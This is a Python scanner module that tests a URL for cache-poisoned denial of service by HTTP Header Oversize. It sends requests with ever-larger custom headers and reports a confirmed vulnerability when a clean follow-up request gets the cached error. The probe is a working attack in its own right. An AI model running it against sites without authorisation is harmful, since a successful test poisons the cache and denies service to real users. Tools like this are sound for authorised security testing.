#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Header Oversize (HHO)
https://cpdos.org/#HHO
"""

from ..utils import * 

VULN_NAME = "HTTP Header Oversize"

def HHO(url, s, main_status_code, authent):
    cpdos_win = False
    max_i = 50
    i = 0

    big_value = "Big-Value-0"

    while i < max_i:
        big_value = big_value + "0" * 50
        h = {f"X-Oversized-Header-{i}":f"{big_value}"}
        #print(h)
        try:
            req_hho = s.get(url, headers=h, auth=authent, allow_redirects=False, timeout=10)
            #print(req_hho.status_code)
            #print(h)
            if req_hho.status_code in [400, 413, 500, 502] and req_hho.status_code != main_status_code:
                print(h)
                print(url)
                print(req_hho.status_code)
                #print(req_hho.headers)
                i = 50
                cpdos_win = True
            i += 1
        except KeyboardInterrupt:
            pass
        except:
            #traceback.print_exc()
            pass
    if cpdos_win:
        req_hho_verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
        if req_hho_verify.status_code in [400, 413, 500, 502] and req_hho_verify.status_code != main_status_code:
            print(f"  \033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}")
        else:
            print(f"  \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}")